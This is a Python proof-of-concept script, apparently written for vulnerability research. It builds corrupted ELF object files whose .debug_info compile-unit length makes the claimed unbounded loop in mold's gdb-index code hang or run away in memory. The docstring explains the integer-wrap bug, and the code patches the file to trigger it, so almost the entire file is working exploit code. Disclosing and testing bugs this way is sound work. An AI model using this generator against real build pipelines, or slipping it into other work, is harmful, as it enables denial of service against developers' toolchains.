#!/usr/bin/env python3
"""Overwrite the unit_length field of the first compile-unit header in a
gcc-compiled object's .debug_info section.

mold's read_compunits() (src/gdb-index.cc) computes the CU stride as
    i64 size = unit_length + 4       (DWARF32)
    i64 size = unit_length + 12      (DWARF64)
then does `p += size` with no bounds check and loops `for (p = begin; p < end;)`.

  - DWARF32: unit_length is a U32; `u32 + 4` wraps mod 2^32. 0xFFFFFFFC -> size 0.
  - DWARF64: unit_length is a U64 assigned to a signed i64; the top-bit-set value
    0xFFFFFFFFFFFFFFF4 -> size 0 (and e.g. 0x8000000000000000 -> a negative i64).

Either way `size == 0` means `p += 0` and the `p < end` loop never terminates,
pushing Compunit records forever -> runaway memory / hang (DoS).

No pyelftools on this host; this is a bare ELF64 section-header walk.

Usage: corrupt_debug_info.py <in.o> <out.o> <kind>
  kind = dwarf32  -> write 4-byte unit_length 0xFFFFFFFC
  kind = dwarf64  -> write 8-byte 64-bit unit_length 0xFFFFFFFFFFFFFFF4
                     (requires the CU to already be DWARF64: magic 0xffffffff)
  kind = dwarf64neg -> write 8-byte 64-bit unit_length 0x8000000000000000
                       (a genuinely negative i64 size -> backward cursor walk)
"""
import struct, sys

def parse_sections(data):
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3a)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3c)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3e)[0]
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, stype, flags, addr, offset, size, link, info, align, entsize = \
            struct.unpack_from("<IIQQQQIIQQ", data, off)
        secs.append(dict(name=name, offset=offset, size=size))
    shstr_off = secs[e_shstrndx]["offset"]
    for s in secs:
        end = data.index(b"\0", shstr_off + s["name"])
        s["strname"] = data[shstr_off + s["name"]:end].decode()
    return secs

def main():
    src, dst, kind = sys.argv[1], sys.argv[2], sys.argv[3]
    data = bytearray(open(src, "rb").read())
    secs = parse_sections(data)
    di = [s for s in secs if s["strname"] == ".debug_info"][0]
    off = di["offset"]
    orig4 = struct.unpack_from("<I", data, off)[0]
    print(f".debug_info at file_off=0x{off:x} size=0x{di['size']:x}; "
          f"first 4 bytes (unit_length lo) = 0x{orig4:08x}")

    if kind == "dwarf32":
        assert orig4 != 0xffffffff, "object is DWARF64 (0xffffffff escape); use kind=dwarf64"
        struct.pack_into("<I", data, off, 0xFFFFFFFC)
        print("  -> wrote DWARF32 unit_length 0xFFFFFFFC (size = unit_length+4 wraps to 0)")
    elif kind in ("dwarf64", "dwarf64neg"):
        assert orig4 == 0xffffffff, "object is not DWARF64 (missing 0xffffffff escape); compile with -gdwarf64"
        val = 0x8000000000000000 if kind == "dwarf64neg" else 0xFFFFFFFFFFFFFFF4
        struct.pack_into("<Q", data, off + 4, val)
        exp = "negative i64" if kind == "dwarf64neg" else "0 (size = unit_length+12 wraps to 0)"
        print(f"  -> wrote DWARF64 unit_length 0x{val:016x} (size -> {exp})")
    else:
        raise SystemExit(f"unknown kind {kind}")

    with open(dst, "wb") as f:
        f.write(data)
    print(f"Wrote {dst}")

if __name__ == "__main__":
    main()
